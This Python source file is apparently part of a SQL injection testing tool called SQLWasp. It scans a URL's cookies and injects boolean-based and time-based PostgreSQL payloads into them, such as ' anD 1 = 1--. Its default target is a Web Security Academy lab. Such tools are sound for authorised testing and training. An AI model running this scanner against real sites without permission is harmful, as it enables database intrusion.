#!/usr/bin/env python3.12
# cookie_vuln_scanner.py
"""
This module contains the CookieVulnScanner class.
"""
import sys
from typing import Union

import click
from rich.console import Console
from rich.markdown import Markdown

from SQLWasp.compare_responses import CompareResponses
from SQLWasp.cookie_injector_core import CookieInjector
from SQLWasp.payloader import Payloader
from SQLWasp.url_checker import UrlChecker
from data.input.data_sources import cookies_display_tab

c = Console()

URL = "https://0a9600c5038042d68007591500a30039.web-security-academy.net/product?productId=9"


# CONFIRMATION_STRING = b"Welcome"
# TRUE_STATEMENT = """' anD 1 = 1--"""
# FALSE_STATEMENT = """' anD 2 = 1--"""
# BOOL_STATEMENTS = [TRUE_STATEMENT, FALSE_STATEMENT]


class CookieVulnScanner:
    """
    The 'CookieVulnScanner' class crates an object capable of scanning a given URL for cookies,
    and automatically inject each of them with False and True statements. It does so by sending
    get requests with the crafted cookie using the 'CookieInjector' class (from 'cookie_injector_core.py'),
    then it compares the responses with the class.
    """

    def __init__(self, url: str, verbose: bool = False) -> None:
        """
        Instantiates the CookieVulnScanner class with the given URL. \n
        :param url: Any valid URL to test for Cookie Injection Vulnerability.
        """
        self.c = Console()
        self.url = url
        self.verbose = verbose
        self.url_checker = None
        self.response = None
        self.cookies = None
        self.cookie_value = None
        self.cookie_name = None
        self.injector = None
        self.response_list = []
        self.responses_difference = None

    def print_cookies_tab(self) -> None:
        """
        Optional method to print cookies in fancy ways.
        :return: None. Console Prints 'self.cookies'
        """
        self.c.print(Markdown(f"*** \n\n# Cookies Found \n"))
        cookies_print_out_template_tab = cookies_display_tab
        for self.cookie_name in self.response.cookies.keys():
            result_message = (
                f"| '{self.cookie_name}' | '{self.cookies[self.cookie_name]}' | '{self.url.strip()}' | \n"
            )
            cookies_print_out_template_tab += result_message
        self.c.print(Markdown(cookies_print_out_template_tab), "", highlight=True)

    # Check the URL status and send the GET request.
    def check_url(self) -> None:
        """
        1st method to be called. It instantiates the 'URLChecker' and uses it
        to sends a GET request to the target URL.
        :return: None. Sets 'self.url_checker'.
        """
        # Instantiate URLChecker
        self.url_checker = UrlChecker((self.url,))
        # Send a GET request for a response from which to extract cookies
        self.url_checker.send_get_request()

    def parse_response(self) -> None:
        """
        2nd method called, it sets the 'self.response' and the 'self.cookies' variables.
        :return: None. Sets 'self.response'.
        """
        self.response = self.url_checker.response
        self.cookies = self.response.cookies  # This is the original response.
        self.print_cookies_tab()

    def init_cookie_injector(self) -> None:
        """
        This method instantiates the 'CookieInjector' class with the current 'self.url',
        CONFIRMATION_STRING, and 'self.cookie_name'.
        :return:
        """
        # pass
        url = self.url.strip()
        self.injector = CookieInjector(url)

    def _run_injector(self, statement: str, response_list: list) -> None:
        """
        This method is called by 'self.compare_responses'. It runs the 'self.injector'
        object by calling its method '.run()'. The Injector sends the GET request, stores
        the response in the 'self.response' variable, which is finally appended to the
        'self.response_list' instance variable.
        :param statement: It is the statement passed to the injector, which will be
        injected in the cookie value.
        :param response_list: The list to which all the responses to the crafted GET requests
        are appended.
        :return: None. Populates the 'self.response_list' list.
        """
        if self.verbose:
            self.c.print(Markdown(f"- Running injector for cookie: {self.cookie_name}."), "")
            self.c.print(Markdown(f"- Statement: {statement}."), "")
        self.injector.run(inject_code=statement, cookie_name=self.cookie_name)
        if self.verbose:
            self.c.print(Markdown(f"- Injecting value: {self.injector.cookie_injected_value}."), "")
        response = self.injector.response
        response_list.append(response)

    def generate_payload(self, boolean_based: bool = False, time_based: bool = False) -> list[tuple[str, str]]:
        """
        Generates a payload based on chosen_attack_type="Boolean-Based" (in this case), and
        chosen_dbms_name="PostgreSQL" (in this case).
        :return: A list of tuples containing the strings of code that will be returned, and injected.
        """
        payloader = Payloader()
        if boolean_based:
            payload = [
                payload for payload in payloader.get_payloads(
                    chosen_attack_type="Boolean-Based",  # "Time-Based Boolean-Based",  # "Boolean-Based",
                    chosen_dbms_name="PostgreSQL"
                )
            ]
        elif time_based:
            payload = [
                payload for payload in payloader.get_payloads(
                    chosen_attack_type="Time-Based",  # "Time-Based Boolean-Based",  # "Boolean-Based",
                    chosen_dbms_name="PostgreSQL"
                )
            ]
        else:
            self.c.print(
                Markdown(f"CookieVulnScanner Payloader Error: Unable to generate payload. No Attack Type selected.")
            )
            sys.exit(1)
        return payload

    def compare_results(self, response_list: list, statement: str, payload_tuple: tuple, verbose: bool = False):
        response_comparer = CompareResponses([{self.cookie_name: response_list}], verbose=verbose)
        return response_comparer.elaborate_responses(self.cookie_name, statement, payload_tuple)

    def test_boolean_based(self) -> Union[list[str], bool]:
        """
        For each cookie obtained by the initial request, it sends a requests with each of the
        two SQL statements, calling the 'self._run_injection' method. So it appends for each
        cookie two responses, the one with the True SQL statement and the one with the False one.
        It creates a dictionary with the name of the cookie, and the responses obtained from
        sending the crafted requests as values. It appends this dictionary to the 'self.response'
        list.
        :return: 'self.response_list'. For each cookie found it stores the response pair in it.
        """
        self.c.print(Markdown(f"#  Processing Cookies"))
        payload = self.generate_payload(boolean_based=True)
        # Send both requests with False and True statements, and store the responses in the list
        # 'response_list'.
        for self.cookie_name in self.cookies.keys():
            response_list = []
            for pair in payload:
                if self.verbose:
                    self.c.print(Markdown(f"\n\n---\n__Processing cookie__: '{self.cookie_name}'\r"), " ")
                statement = ""
                for statement in pair:
                    # Populate the local response list with the response pair for the current cookie.
                    self._run_injector(statement, response_list)
                # self.response_list.append(response_list)
                if self.verbose:
                    self.responses_difference = self.compare_results(response_list, statement, pair, verbose=True)
                else:
                    self.responses_difference = self.compare_results(response_list, statement, pair)
                response_list = []
                # self.response_list = []
        return self.responses_difference

    def test_time_based(self):
        self.c.print(Markdown(f"#  Processing Cookies"))
        payload = self.generate_payload(time_based=True)
        for self.cookie_name in self.cookies.keys():
            response_list = []
            for pair in payload:
                for statement in pair:
                    self._run_injector(statement, response_list)
                    self.c.print(
                        f"Cookie '{self.cookie_name}': "
                        f"Time elapsed for statement '{statement}': {self.injector.get_request_response_time:.4f}"
                    )


@click.command(
    help="This is a Cookie SQLInjection Vulnerability Scanner. It scans the response, to the GET request "
         "sent to the web application, for cookies. If found it injects False and True statements, and "
         "examines the responses. Currently supports: \n\n"
         "• Boolean-Based Injection Discovery\n\n"
         "• Time-Based Injection Discovery\n\n"
)
@click.argument(
    "url",
    required=True,
    default=URL,
    nargs=1,
    metavar="URL",
    type=str,

)
@click.option(
    "-v", "--verbose",
    help="Use this flag for verbosity.",
    is_flag=True,
    default=False,
    required=False,
)
def main(url, verbose):
    cook_v_scan = CookieVulnScanner(url, verbose)
    cook_v_scan.check_url()
    cook_v_scan.parse_response()
    cook_v_scan.init_cookie_injector()
    # Testing with content comparison
    # cook_v_scan.test_boolean_based()
    # response_list = cook_v_scan.test_boolean_based()
    response_list = cook_v_scan.test_time_based()
    # c.print(response_list)


if __name__ == '__main__':
    main()
